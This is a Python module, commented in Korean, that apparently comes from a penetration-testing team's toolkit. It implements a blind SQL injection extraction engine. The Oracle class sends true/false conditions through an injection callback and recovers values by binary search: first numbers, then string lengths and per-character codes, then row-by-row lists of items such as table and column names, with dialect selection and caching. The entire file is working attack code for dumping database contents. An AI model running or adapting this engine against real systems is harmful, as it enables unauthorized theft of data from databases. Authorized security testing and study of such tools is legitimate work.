"""참·거짓만 알 수 있는 상황에서 값을 읽어 내는 엔진(블라인드 추출).

팀이 쓰던 `08_모의해킹/tools/lecture_list_blind_sqli.py` 의 계산 부분을 옮겨 왔다.
달라진 점: DBMS 별 표현을 골라 쓰고, 한 번 읽은 값은 DB 에 적어 두고 다시 묻지 않는다.

모듈은 '조건 하나를 보내고 참/거짓을 알려 주는 함수' 하나만 만들면 된다.
어떻게 주입하는지(어느 파라미터에 어떤 모양으로)는 모듈이 정한다.
"""
import string

from .payloads import DBMS, ensure_select_only

# 읽는 값의 성격에 따라 찾아볼 글자 범위를 좁힌다. 좁을수록 요청이 적게 든다.
CHARSETS = {
    "ident": (ord("#"), ord("z"), "테이블·컬럼 이름(영문·숫자·_)"),
    "ascii": (0x20, 0x7E, "영문·숫자·기호"),
    "text": (0x20, 0xFFFF, "한글 포함 아무 글자"),
}
MAX_LENGTH = 400


class Oracle:
    """참·거짓 질문을 주고받는 통로. 기준 측정·캐시·요청 수 세기를 맡는다."""

    def __init__(self, ask_true, dbms="oracle", cache=None, charset="ascii"):
        self.ask_true = ask_true              # (조건 문자열) -> bool
        self.sql = DBMS[dbms]
        self.cache = cache if cache is not None else {}
        self.charset = charset
        self.asked = 0
        self.cached_hits = 0

    def _is_true(self, condition):
        self.asked += 1
        return self.ask_true(condition)

    def scalar(self, expr):
        """값 하나를 돌려주는 SELECT 를 괄호로 묶어 조건 안에 넣을 수 있게 한다."""
        return f"({ensure_select_only(expr)})"

    # ── 숫자 읽기 ─────────────────────────────────────────────
    def read_number(self, expr, low=0, high=1_000_000):
        """숫자 하나를 범위를 반씩 줄여 가며 찾는다. 없으면 None."""
        value = self.scalar(expr)
        if not self._is_true(f"{value} IS NOT NULL"):
            return None
        if not self._is_true(f"{value} <= {high}"):
            return None
        while low < high:
            mid = (low + high) // 2
            if self._is_true(f"{value} <= {mid}"):
                high = mid
            else:
                low = mid + 1
        return low

    # ── 글자 읽기 ─────────────────────────────────────────────
    def read_text(self, expr, charset=None, on_char=None):
        """글자 값 하나를 한 글자씩 읽는다. 캐시에 있으면 묻지 않는다."""
        key = expr.strip()
        if key in self.cache:
            self.cached_hits += 1
            return self.cache[key]

        value = self.scalar(expr)
        if not self._is_true(f"{value} IS NOT NULL"):
            self.cache[key] = None
            return None

        length = self.read_number(f"SELECT {self.sql['length'].format(expr=expr)}{self.sql['from']}",
                                  high=MAX_LENGTH)
        if not length:
            self.cache[key] = ""
            return ""

        lo, hi, _ = CHARSETS[charset or self.charset]
        chars = []
        for pos in range(1, length + 1):
            code_sql = f"SELECT {self.sql['code'].format(expr=expr, pos=pos)}{self.sql['from']}"
            code = self.read_number(code_sql, low=lo, high=hi)
            ch = _to_char(code, self.sql["bytes"]) if code is not None else "?"
            chars.append(ch)
            if on_char:
                on_char(ch)
        text = "".join(chars)
        self.cache[key] = text
        return text

    # ── 목록 읽기 ─────────────────────────────
    def nth(self, list_sql, n):
        """여러 행을 돌려주는 SELECT 에서 n 번째(1부터) 값 하나를 읽는 SELECT."""
        return self.sql["nth"].format(list=list_sql, n=n, n0=n - 1)

    def read_list(self, list_sql, limit, offset=0, charset=None, on_value=None):
        """목록에서 offset 다음 limit 개를 읽는다. 값이 끝나면 거기서 멈춘다.

        비싼 작업이라 한 번에 조금씩 읽고, 더 보려면 offset 을 옮겨 다시 돌린다.
        """
        out = []
        for i in range(offset + 1, offset + limit + 1):
            value = self.read_text(self.nth(list_sql, i), charset=charset)
            if value is None:
                break
            out.append(value)
            if on_value:
                on_value(value)
        return out


def _to_char(code, as_bytes=True):
    """DB 가 숫자로 알려 준 글자 코드를 사람이 읽는 글자로 되돌린다.

    Oracle 의 ASCII() 는 한글을 UTF-8 바이트를 이어 붙인 큰 수로 준다
    (예: '테' → 0xED858C). 그래서 큰 수는 바이트로 쪼개 다시 조립한다.
    """
    if code is None:
        return "?"
    if code < 0x80:
        return chr(code)
    if not as_bytes:
        return chr(code)                       # UNICODE() 처럼 코드포인트를 주는 DB
    length = 2 if code < 0x10000 else 3
    return code.to_bytes(length, "big").decode("utf-8", "replace")
